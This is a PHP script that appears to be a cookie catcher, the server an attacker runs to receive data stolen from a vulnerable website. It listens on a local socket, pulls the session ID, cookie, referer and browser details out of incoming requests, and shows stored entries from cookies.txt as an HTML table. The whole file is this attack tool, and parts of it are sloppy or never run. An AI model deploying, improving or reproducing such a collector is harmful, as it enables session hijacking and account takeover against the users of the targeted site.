<?php

$WS_PREFIX = "WS> ";
while(true){

    try{
// set some variables
        $host = "localhost";
        /*****  GETTING INFO FROM VULNARABLE WEB SITE  ******/
        $port = 6004;
        echo "\n###########################\nlistening socket..\n";

        set_time_limit(0); //no timeout

// create socket
        $socket = socket_create(AF_INET, SOCK_STREAM, 0);
// bind socket to port
        $result = socket_bind($socket, $host, $port);
// start listening for connections
        $result = socket_listen($socket, 3);
// accept incoming connections

// spawn another socket to handle communication
        $spawn = socket_accept($socket);

// read client input
        $input = socket_read($spawn, 1024);
        echo "\nWS: input from socket: \n";
        echo $input;
        $urlline = "";
        $clientIPAddr = "";
        $clientPort = "";
        $browserInfo = "";
        $clientOS = "";
        $date = "";
        $sessionID="";
        $referer="";
        $cookie="";
        echo $WS_PREFIX . "COOKIE AND URL INFO:\n";
        foreach(preg_split("/((\r?\n)|(\r\n?))/", $input) as $line){
            if(strpos($line, 'GET /') !== false)
            {
                $urlline = $line;
            }
            else if(strpos($line, 'Host') !== false)
            {
                $clientPort = str_replace('Host: localhost:', '', $line);
                echo $WS_PREFIX . "client port: " . $clientPort . "\n";;
            }
            else if(strpos($line, 'User-Agent') !== false)
            {
                $browserInfo = $line;
                $clientOS = $line;
                echo $WS_PREFIX . "browser and os info: " . $browserInfo . "\n";;
            }
            else if(strpos($line, 'Origin') !== false)
            {
                $clientIPAddr = str_replace('Origin: ', '', $line);
                echo $WS_PREFIX . "client IP Address: " . $clientIPAddr . "\n";
            }
        }
# parse url parameters by &
        trim($urlline);
        parse_str($urlline,$output);
        echo $WS_PREFIX . "session id: " . $output["sessionID"] . "\n";
        echo $WS_PREFIX . "date: " . $output["date"] . "\n";
        echo $WS_PREFIX . "cookie: " . $output["cookie"] . "\n";
        echo $WS_PREFIX . "referer: " . $output["referer"] . "\n";
# Display info on a webpage
        echo '<table border="1">';
        $file = fopen("cookies.txt", "r") or die("Unable to open file!");
        while (!feof($file)){
            $data = fgets($file);
            echo "<tr><td>" . str_replace('|','</td><td>',$data) . '</td></tr>';
        }
        echo '</table>';
        fclose($file);

    }catch(Exception $e){
        echo "error occured :" . $e;
        continue;
    }
}
// close sockets
socket_close($spawn);
socket_close($socket);
?>